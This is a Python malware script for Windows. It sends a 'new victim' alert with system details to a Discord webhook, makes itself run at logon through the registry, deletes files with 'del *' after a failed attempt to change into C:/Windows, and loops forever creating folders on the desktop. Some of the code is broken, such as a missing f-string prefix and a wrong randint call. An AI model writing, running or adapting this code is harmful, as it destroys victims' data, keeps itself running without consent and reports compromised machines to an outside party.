import os
import sys
import winreg
import requests
from datetime import datetime
import random

webhook_url = 'your_discord_webhook_url_here'

network_info = os.system('netsh')

def newvictimalert():
    Message = {
        'content': f'New victim alert!\nTime: {datetime.now()}\nSystem: {os.name}\nNetwork info: {network_info}\nExtra info: {sys.argv[0]}'
    }
    requests.post(webhook_url, Message)

def cls():
    if os.name == 'nt':
        os.system('cls')

def autoload():
    if os.name == 'nt':
        script_name = sys.argv[0]
        script_path = os.path.abspath(script_name)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, f"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "system_load", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    else:
        cls()

def destroy():
    if os.name == 'nt':
        try:
            os.system('cd C:/Windows')
            os.system('del *')
        except Exception as e:
            Message = {
                'content': f'Error!\nTime: {datetime.now()}\nSystem: {os.name}\nError: {e}\nNetwork info: {network_info}\nExtra info: {sys.argv[0]}'
            }
            requests.post(webhook_url, Message)
    else:
        cls()

def make_folders():
    while True:
        try:
            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
            funny_path = os.path.join(desktop_path, 'lol-{random.randint(100)}')
            
            os.makedirs(funny_path)
        except Exception as e:
            Message = {
                'content': f'Error!\nTime: {datetime.now()}\nSystem: {os.name}\nError: {e}\nNetwork info: {network_info}\nExtra info: {sys.argv[0]}'
            }

if __name__ == '__main__':
    newvictimalert()
    autoload()
    destroy()
    make_folders()
